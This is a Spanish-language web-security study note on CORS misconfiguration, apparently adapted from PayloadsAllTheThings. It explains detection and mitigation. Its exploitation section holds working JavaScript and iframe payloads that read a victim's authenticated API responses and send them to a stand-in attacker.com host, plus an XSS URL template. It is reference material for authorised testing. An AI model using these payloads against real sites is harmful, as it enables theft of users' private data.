---
tags:
  - seguridad-web
  - owasp
  - cors
aliases:
  - CORS Misconfiguration
---

# CORS mal configurado

**Una política CORS demasiado permisiva permite que un sitio atacante haga peticiones cross-origin con las credenciales de la víctima y lea la respuesta.** El problema aparece cuando el servidor refleja el header `Origin` sin validarlo y responde con `Access-Control-Allow-Credentials: true`.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
El navegador aplica la política del mismo origen (SOP), pero CORS la relaja mediante headers de respuesta. Si el servidor devuelve `Access-Control-Allow-Origin` reflejando el `Origin` del atacante junto a `Access-Control-Allow-Credentials: true`, una página maliciosa puede leer datos privados de la API en nombre de la víctima autenticada.

Condiciones para explotar:
- Petición: `Origin: https://attacker.com`
- Respuesta vulnerable: `Access-Control-Allow-Credentials: true` y `Access-Control-Allow-Origin: https://attacker.com` (o `null`).

## Detección y pruebas
Enviar un `Origin` arbitrario y observar la respuesta:
- **Reflejo del Origin**: el servidor copia tu dominio en `ACAO`.
- **Origin null permitido**: `ACAO: null` (explotable desde un iframe con `data:` URI).
- **Comodín sin credenciales**: `ACAO: *` (el navegador no envía cookies, pero sirve para datos sin auth, p. ej. en redes internas).
- **Regex débil**: prefijos/sufijos o punto sin escapar (`^api.example.com$`) aceptan `evilexample.com` o `apiiexample.com`.

## Explotación / payloads
Reflejo del Origin (script alojado en `attacker.com`):
```js
var req = new XMLHttpRequest();
req.onload = () => location='//attacker.com/log?key='+req.responseText;
req.open('get','https://victim.example.com/endpoint',true);
req.withCredentials = true;
req.send();
```

Origin `null` (iframe con `data:` URI fuerza un origen null):
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req=new XMLHttpRequest();
  req.onload=()=>location='https://attacker.com/log?key='+encodeURIComponent(req.responseText);
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials=true;req.send();
</script>"></iframe>
```

XSS en origen de confianza: si la whitelist es estricta, un XSS en un dominio permitido inyecta el payload anterior:
```
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

## Mitigación
- Validar `Origin` contra una whitelist estricta de orígenes; nunca reflejarlo dinámicamente.
- No combinar `Access-Control-Allow-Origin: *` con `Access-Control-Allow-Credentials: true`.
- Evitar permitir el origen `null`.
- Construir las comparaciones de origen con coincidencia exacta (escapar puntos, anclar regex, no usar `startsWith`/`endsWith`).
- Minimizar los endpoints que devuelven datos sensibles vía CORS.

## Herramientas
- Corsy, CORScanner, CorsOne (escáneres de configuración CORS).
- of-cors (explotación en redes internas), PostMessage POC Builder.

---
🔗 Relacionado: [[XSS (Cross-Site Scripting)]] · [[CSRF (Cross-Site Request Forgery)]] · [[WebSockets (seguridad)]]
📚 Fuente: [PayloadsAllTheThings — CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration) (MIT, © Swissky)
